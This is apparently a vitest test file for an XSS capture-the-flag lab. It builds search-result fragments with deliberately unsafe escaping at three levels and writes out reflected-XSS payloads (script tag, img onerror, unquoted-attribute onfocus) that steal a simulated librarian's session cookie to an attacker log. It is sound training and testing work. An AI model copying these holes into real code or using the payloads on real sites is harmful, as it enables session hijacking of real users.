// An XSS lab in miniature (XV-01 "Scriptorium Mirror"), proving the core/xss recipe end to end through real HTTP:
// the player reads their marker on the lab page -> sends the librarian a search link -> the librarian's simulated
// browser renders the reflected page -> the static oracle says the payload ran -> the librarian's session key lands in
// the attacker log -> the player signs in with it -> flag. The player watches the payload fire in the sandboxed preview
// only. Divine escapes; its librarian sees the marker as text.
import { randomBytes } from 'node:crypto';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import type { Request, Response } from 'express';
import { parseFragment } from 'parse5';
import { describe, expect, it } from 'vitest';
import request from 'supertest';
import { field, perSession } from '../src/core/lab.js';
import type { Level } from '../src/core/levels.js';
import { flagFor } from '../src/core/mount.js';
import { defineChallenge, register } from '../src/core/registry.js';
import { escapeHtml, sendPage } from '../src/core/render.js';
import { sendLinkAction, simWorld, type SimBrowser, type SimRequest, type SimResponse, type SimWorld } from '../src/core/sim.js';
import {
  XSS_STEAL_URL, newMarker, previewFrame, xssBrowser, xssOracle, type XssBrowser, type XssMarker,
} from '../src/core/xss.js';
import {
  FLAG_RE, attackerHits, describeExploitMatrix, describeLabView, freshSession, panelOf, setCookieHeader, unescapeHtml, type Agent,
} from './helpers.js';

const view = join(dirname(fileURLToPath(import.meta.url)), 'fixtures', 'xss-mirror.ejs');
const LAB = '/d/xss-test/mirror';
const PLAYER = { username: 'pilgrim', password: 'pilgrim' };

// --- The fixture lab -------------------------------------------------------------------------------------------

// The "level files": the one fragment each level builds from the query. The citadel (the librarian's browser) and the
// real route (the player's preview) both call it, so the oracle judges exactly what the player watches.
const RESULTS: Readonly<Record<Level, (q: string) => string>> = {
  acolyte: (q) => `<p>No scrolls match <b>${q}</b>.</p>`, // concatenated raw
  templar: (q) => `<p>No scrolls match <b>${q.replace('<script>', '').replace('</script>', '')}</b>.</p>`, // strips once, case-sensitive
  inquisitor: (q) => `<form class="refine"><input name=q value=${q.replace(/</g, '&lt;').replace(/>/g, '&gt;')}><button>Again</button></form>`, // no quotes
  divine: (q) => `<p>No scrolls match <b>${escapeHtml(q)}</b>.</p>`, // escaped for its context
};
const SESSION = 'mirror_session';

interface Mirror { readonly world: SimWorld; readonly marker: XssMarker; readonly key: string; readonly librarian: XssBrowser }

/** The Mirror as the librarian's browser sees it at http://citadel.test: in process, never HTTP. */
function citadel(level: Level, r: SimRequest): SimResponse {
  if (r.path === '/search') return { status: 200, body: `<h1>Scroll search</h1>${RESULTS[level](r.query.get('q') ?? '')}` };
  if (r.path === '/logout') return { status: 200, headers: { 'Set-Cookie': `${SESSION}=; Max-Age=0; Path=/` }, body: 'Signed out.' };
  if (r.path === '/') return { status: 200, body: '<h1>Scriptorium Mirror</h1>' };
  return { status: 404, body: 'Not found' };
}

const labs = perSession((level): Mirror => {
  const world = simWorld();
  const marker = newMarker();
  const key = randomBytes(8).toString('hex');
  const lab: Mirror = {
    world, marker, key,
    // The payload "sends document.cookie home": the librarian's session, when signed in.
    librarian: xssBrowser(world, (r) => citadel(level, r), { marker: marker.call, canary: () => lab.librarian.cookies.get(SESSION) ?? '' }),
  };
  lab.librarian.cookies.set(SESSION, key);
  return lab;
});
const labFor = (req: { sessionId: string; level: Level }): Mirror => labs.for(req);
/** The librarian starts every action signed in, whatever the player's last link did (no Restart on this lab). */
const rearm = (req: Request, librarian: SimBrowser): void => { librarian.cookies.set(SESSION, labFor(req).key); };

const MIRROR = register(defineChallenge({
  id: 'XV-01', district: 'xss-test', slug: 'mirror', dir: process.cwd(),
  title: { id: 'Cermin', en: 'Mirror' }, summary: { id: 'Fixture', en: 'Fixture' },
  maps: [], levels: ['acolyte', 'templar', 'inquisitor', 'divine'], hints: [],
  victim: {
    sim: (req) => labFor(req).world,
    actions: [sendLinkAction((req) => labFor(req).librarian, {
      rearm, description: { id: 'membuka tautan pencarian yang Anda kirim, saat masuk', en: 'opens the search link you send, while signed in' },
    })],
  },
  mount: (router) => {
    const show = (req: Request, res: Response, result: { ok: boolean; text: string } | null, key: string) => {
      const lab = labFor(req);
      const q = typeof req.query.q === 'string' ? req.query.q : '';
      // The only raw output: the level's fragment, inside the sandboxed preview frame.
      const preview = q === '' ? '' : previewFrame(RESULTS[req.level](q), { marker: lab.marker.call, title: 'Search results preview' });
      return sendPage(res, view, { account: PLAYER, marker: lab.marker.call, q, preview, result, key });
    };
    router.get('/', (req, res) => show(req, res, null, ''));
    router.post('/', async (req, res) => {
      const key = field(req, 'key');
      const ok = key !== '' && key === labFor(req).key;
      const text = !ok ? 'Wrong session key.' : req.level === 'divine' ? 'Signed in as the librarian.' : `Signed in as the librarian. Flag: ${flagFor(req, MIRROR)}`;
      await show(req, res, { ok, text }, key);
    });
  },
}));

// --- Player helpers --------------------------------------------------------------------------------------------

type Script = (agent: Agent, level: Level, sid: string) => Promise<request.Response>;
const labPage = (agent: Agent, level: Level, query = '') => agent.get(`${LAB}?level=${level}&lang=en${query}`);
const markerOn = (html: string): string => unescapeHtml(/<code data-marker>([^<]*)<\/code>/.exec(html)?.[1] ?? '');
const sendSearch = (agent: Agent, level: Level, q: string) =>
  agent.post(`${LAB}/victim/send-link?level=${level}`).type('form').send({ url: `http://citadel.test/search?q=${encodeURIComponent(q)}` });
const stolenKey = (html: string): string => {
  const hit = attackerHits(html).find((h) => h.url.startsWith(`${XSS_STEAL_URL}?`));
  return hit === undefined ? 'none' : new URL(hit.url).searchParams.get('c') ?? 'none';
};

/** The exploit, as a player does it: read the marker, send the librarian a search for the payload, read the log, sign in. */
const exploit = (payload: (marker: string) => string): Script => async (agent, level) => {
  const marker = markerOn((await labPage(agent, level)).text);
  await sendSearch(agent, level, payload(marker));
  const key = stolenKey((await labPage(agent, level)).text);
  return agent.post(`${LAB}?level=${level}`).type('form').send({ key });
};

// --- Tests -------------------------------------------------------------------------------------------------------

describeExploitMatrix<Script>({
  challenge: MIRROR,
  path: LAB,
  send: (agent, level, script, _url, { sid }) => script(agent, level, sid),
  exploits: {
    acolyte: exploit((m) => `<script>${m}</script>`), // an element
    templar: exploit((m) => `<img src=x onerror=${m}>`), // the strip removes one spelling of one tag: a handler stands in
    inquisitor: exploit((m) => `x autofocus onfocus=${m}`), // no angle brackets: an unquoted attribute breaks on a space
  },
  resisted: 'Wrong session key.',
  legit: [
    { name: 'a search', input: (a, l) => labPage(a, l, '&q=psalter'), expect: /Results for <code>psalter<\/code>/ },
    { name: 'a wrong key', input: (a, l) => a.post(`${LAB}?level=${l}`).type('form').send({ key: 'nope' }), expect: 'Wrong session key.' },
    {
      name: 'the librarian searches plain words: nothing leaks',
      input: async (a, l) => { await sendSearch(a, l, 'psalter'); return labPage(a, l); },
      expect: /ended on a citadel\.test page \(HTTP 200\)[\s\S]*No requests yet\./,
    },
  ],
  malformed: [],
  privileged: {
    name: 'the real session key',
    input: (a, l, sid) => a.post(`${LAB}?level=${l}`).type('form').send({ key: labFor({ sessionId: sid, level: l }).key }),
    expect: 'Signed in as the librarian.',
  },
});

describeLabView({
  challenge: MIRROR,
  path: LAB,
  account: /pilgrim[\s\S]{0,40}\/[\s\S]{0,40}pilgrim/,
  echoField: 'key',
  oddBodies: [{ key: { toString: 1 } }, { key: ['a'] }, [1, 2], {}],
  ok: (agent, level, sid) => agent.post(`${LAB}?level=${level}`).type('form').send({ key: labFor({ sessionId: sid, level }).key }),
  bad: (agent, level) => agent.post(`${LAB}?level=${level}`).type('form').send({ key: 'nope' }),
});

/** The preview frame on a lab page: its srcdoc document, as the browser decodes the attribute. */
const previewSrcdoc = (html: string): string => {
  const frame = /<iframe class="xss-preview"[^>]*><\/iframe>/.exec(html)?.[0] ?? '';
  const el = parseFragment(frame).childNodes.find((n) => 'tagName' in n);
  return el !== undefined && 'attrs' in el ? el.attrs.find((a) => a.name === 'srcdoc')?.value ?? '' : '';
};

describe('XSS lab: the full recipe over HTTP', () => {
  it('marker -> search link -> the librarian renders it -> the oracle -> the stolen key in your log -> flag', async () => {
    const { agent, sid } = await freshSession();
    const lab = labFor({ sessionId: sid, level: 'acolyte' });
    const marker = markerOn((await labPage(agent, 'acolyte')).text);
    expect(marker).toBe(lab.marker.call);
    expect((await sendSearch(agent, 'acolyte', `<script>${marker}</script>`)).status).toBe(303);
    const page = await labPage(agent, 'acolyte');
    const panel = panelOf(page.text);
    expect(panel).toContain(`<code>GET ${XSS_STEAL_URL}?c=${lab.key}</code>`);
    expect(panel).toContain('Visit 1: 1 request(s); ended on a citadel.test page (HTTP 200).');
    const searched = new URL(`http://citadel.test/search?q=${encodeURIComponent(`<script>${marker}</script>`)}`).href; // as WHATWG serializes it
    expect(lab.librarian.verdicts.map((v) => [v.url, v.fired])).toEqual([[searched, true]]);
    const signIn = await agent.post(`${LAB}?level=acolyte`).type('form').send({ key: stolenKey(page.text) });
    expect(signIn.text).toMatch(FLAG_RE);
  });

  it('divine: the librarian sees your marker as text, and your server receives nothing', async () => {
    const { agent, sid } = await freshSession();
    const marker = markerOn((await labPage(agent, 'divine')).text);
    for (const q of [`<script>${marker}</script>`, `<img src=x onerror=${marker}>`, `x autofocus onfocus=${marker}`]) await sendSearch(agent, 'divine', q);
    expect(attackerHits((await labPage(agent, 'divine')).text)).toEqual([]);
    const verdicts = labFor({ sessionId: sid, level: 'divine' }).librarian.verdicts;
    expect(verdicts.map((v) => [v.fired, v.page.reachedMarker])).toEqual([[false, true], [false, true], [false, true]]);
  });

  it('your page runs the payload only inside the sandboxed preview: the same fragment the librarian got, isolated', async () => {
    const { agent, sid } = await freshSession();
    for (const level of ['acolyte', 'templar', 'inquisitor'] as const) {
      const { call } = labFor({ sessionId: sid, level }).marker;
      const q = level === 'inquisitor' ? `x autofocus onfocus=${call}` : `<img src=x onerror=${call}>`;
      const res = await labPage(agent, level, `&q=${encodeURIComponent(q)}`);
      expect(res.status).toBe(200);
      expect(previewSrcdoc(res.text).endsWith(`<body>${RESULTS[level](q)}</body></html>`), level).toBe(true);
      expect(xssOracle(RESULTS[level](q), call).executes, level).toBe(true); // it runs on the librarian's page...
      const v = xssOracle(res.text, call); // ...and on yours only where the frame isolates it
      expect(v.executes, level).toBe(false);
      expect(v.sinks.filter((s) => s.marker).length, level).toBeGreaterThan(0);
      expect(v.sinks.filter((s) => s.marker).every((s) => s.isolated), level).toBe(true);
      expect(res.text, level).not.toContain(`onerror=${call}`); // never raw on the platform page
      expect(res.text, level).toContain('sandbox="allow-scripts"');
    }
  });

  it('your session cookie is HttpOnly and SameSite=Lax: script never reads it, the preview frame included (opaque origin)', async () => {
    const { app } = await freshSession();
    const sid = setCookieHeader(await request(app).get('/healthz'), 'hvwa_sid') ?? ''; // a request with no session gets one
    expect(sid).toMatch(/;\s*HttpOnly/i);
    expect(sid).toMatch(/;\s*SameSite=Lax/i);
    expect(previewFrame('<p>x</p>')).not.toContain('allow-same-origin');
  });

  it('isolates players and levels: your marker runs nowhere else', async () => {
    const a = await freshSession();
    const b = await freshSession(a.app);
    const markerA = markerOn((await labPage(a.agent, 'acolyte')).text);
    await sendSearch(b.agent, 'acolyte', `<script>${markerA}</script>`); // B sends A's payload to B's librarian
    expect(attackerHits((await labPage(b.agent, 'acolyte')).text)).toEqual([]);
    await sendSearch(a.agent, 'templar', `<script>${markerA}</script>`); // A's acolyte marker at A's templar level
    expect(attackerHits((await labPage(a.agent, 'templar')).text)).toEqual([]);
    await sendSearch(a.agent, 'acolyte', `<script>${markerA}</script>`);
    expect(stolenKey((await labPage(a.agent, 'acolyte')).text)).toBe(labFor({ sessionId: a.sid, level: 'acolyte' }).key);
    expect(attackerHits((await labPage(b.agent, 'acolyte')).text)).toEqual([]);
  });

  it('a link that signs the librarian out never leaves the lab stuck: every action re-arms', async () => {
    const { agent, sid } = await freshSession();
    const lab = labFor({ sessionId: sid, level: 'acolyte' });
    await agent.post(`${LAB}/victim/send-link?level=acolyte`).type('form').send({ url: 'http://citadel.test/logout' });
    expect(lab.librarian.cookies.get(SESSION)).toBeUndefined();
    const res = await exploit((m) => `<script>${m}</script>`)(agent, 'acolyte', sid);
    expect(res.text).toMatch(FLAG_RE);
  });

  it('keeps the search escaped in the lab chrome and in its field, and keeps the level in the search form', async () => {
    const { agent } = await freshSession();
    const res = await labPage(agent, 'templar', `&q=${encodeURIComponent('"><b>x</b>')}`);
    expect(res.text).toContain('value="&#34;&gt;&lt;b&gt;x&lt;/b&gt;"');
    expect(res.text).toContain('Results for <code>&#34;&gt;&lt;b&gt;x&lt;/b&gt;</code>');
    expect(res.text).toContain('<input type="hidden" name="level" value="templar">');
    expect(res.text).not.toContain('<b>x</b>');
  });
});
